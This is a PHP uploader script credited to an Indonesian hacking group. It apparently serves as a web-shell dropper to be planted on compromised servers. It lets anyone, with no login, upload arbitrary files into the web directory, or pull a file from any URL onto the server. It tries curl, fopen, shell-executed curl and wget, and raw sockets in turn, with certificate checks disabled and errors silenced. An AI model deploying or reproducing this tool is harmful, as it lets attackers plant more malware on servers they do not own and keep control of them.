<?php
// Credits By ribelcyberteam@gmail.com
// Tele @RibelCyberTeam

ini_set('upload_max_filesize', '100M');
ini_set('post_max_size', '100M');
$status = "";
$cwd    = getcwd();

if (!empty($_FILES['ribel']['name'])) {
    $orig = $_FILES['ribel']['name'];
    $tmp  = $_FILES['ribel']['tmp_name'];
    $err  = $_FILES['ribel']['error'];

    if ($err !== UPLOAD_ERR_OK) {
        $status = "Upload error (kode: " . (int)$err . ")";
    } else {
        $new  = basename($orig);
        $dest = $cwd . DIRECTORY_SEPARATOR . $new;
        if (move_uploaded_file($tmp, $dest)) {
            @chmod($dest, 0644);
            $status = "File Berhasil Diupload Masse: <br>" . $dest;
        } else {
            $status = "Terjadi Kesalahan Saat Mengupload File Masse";
        }
    }
}
elseif (!empty($_POST['url'])) {
    $url      = trim($_POST['url']);
    $filename = trim(isset($_POST['urlname']) ? $_POST['urlname'] : '');

    if ($filename === '') {
        $filename = basename(parse_url($url, PHP_URL_PATH));
        if ($filename === '' || $filename === '.') $filename = 'upload_' . time();
    }

    $new  = basename($filename);
    $dest = $cwd . DIRECTORY_SEPARATOR . $new;

    if (!preg_match('#^https?://#i', $url)) $url = 'http://' . $url;

    $blob = false;
    $method = 'none';

    if (!$blob && function_exists('curl_init')) {
        $ch = @curl_init($url);
        if ($ch) {
            @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 60);
            @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
            @curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
            $r = @curl_exec($ch);
            @curl_close($ch);
            if ($r !== false && $r !== '') { $blob = $r; $method = 'curl'; }
        }
    }

    if (!$blob && @ini_get('allow_url_fopen')) {
        $ctx = @stream_context_create(array(
            'http' => array('timeout' => 60, 'user_agent' => 'Mozilla/5.0', 'follow_location' => 1),
            'ssl'  => array('verify_peer' => false, 'verify_peer_name' => false),
        ));
        $r = @file_get_contents($url, false, $ctx);
        if ($r !== false && $r !== '') { $blob = $r; $method = 'fopen'; }
    }

    if (!$blob && function_exists('exec')) {
        $tmpf = $dest . '.tmp';
        @exec('curl -fsSL --max-time 60 -A "Mozilla/5.0" -o ' . escapeshellarg($tmpf) . ' ' . escapeshellarg($url) . ' 2>/dev/null', $o, $rc);
        if ($rc === 0 && @is_file($tmpf) && @filesize($tmpf) > 0) {
            $blob = @file_get_contents($tmpf); @unlink($tmpf); $method = 'curl_exec';
        }
    }

    if (!$blob && function_exists('exec')) {
        $tmpf = $dest . '.tmp';
        @exec('wget -q --timeout=60 --tries=2 --no-check-certificate -O ' . escapeshellarg($tmpf) . ' ' . escapeshellarg($url) . ' 2>/dev/null', $o, $rc);
        if ($rc === 0 && @is_file($tmpf) && @filesize($tmpf) > 0) {
            $blob = @file_get_contents($tmpf); @unlink($tmpf); $method = 'wget';
        }
    }

    if (!$blob && function_exists('fsockopen')) {
        $p = parse_url($url);
        if ($p && isset($p['host'])) {
            $host = $p['host'];
            $path = isset($p['path']) ? $p['path'] : '/';
            if (isset($p['query'])) $path .= '?' . $p['query'];
            $ssl  = isset($p['scheme']) && $p['scheme'] === 'https';
            $port = isset($p['port']) ? (int)$p['port'] : ($ssl ? 443 : 80);
            $fp = @fsockopen(($ssl ? 'ssl://' : '') . $host, $port, $e, $es, 15);
            if ($fp) {
                @fwrite($fp, "GET $path HTTP/1.0\r\nHost: $host\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n");
                $raw = '';
                while (!feof($fp)) $raw .= @fread($fp, 8192);
                @fclose($fp);
                $sep = strpos($raw, "\r\n\r\n");
                if ($sep !== false) {
                    $body = substr($raw, $sep + 4);
                    if ($body !== '') { $blob = $body; $method = 'fsockopen'; }
                }
            }
        }
    }
    if ($blob === false) {
        $status = "Gagal fetch dari URL. Semua metode (curl_ext, fopen, curl_exec, wget, fsockopen) gagal.";
    } elseif (@file_put_contents($dest, $blob) !== false) {
        @chmod($dest, 0644);
        $status = "File Berhasil Didownload via [" . $method . "]: <br>" . $dest . " (" . strlen($blob) . " bytes)";
    } else {
        $status = "Fetch OK via [$method] tapi gagal tulis ke " . $dest;
    }
}
else {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $status = "Silahkan Pilih Filenya Dulu Masse";
    }
}
?>
<html>
<head>
<meta charset="utf-8">
</head>
<body>
<?php if ($status !== "") { echo $status; } ?>
<hr>
<form action="" method="POST" enctype="multipart/form-data">
<input type="file" name="ribel">
<input type="submit" name="submit" value="Gass Masse">
</form>

<hr>

<form action="" method="POST">
<input type="text" name="url" placeholder="https://example.com/file.txt" size="40">
<input type="text" name="urlname" placeholder="nama file (extensi asli)" size="20">
<input type="submit" name="submit_url" value="Gass URL">
</form>
</body>
</html>
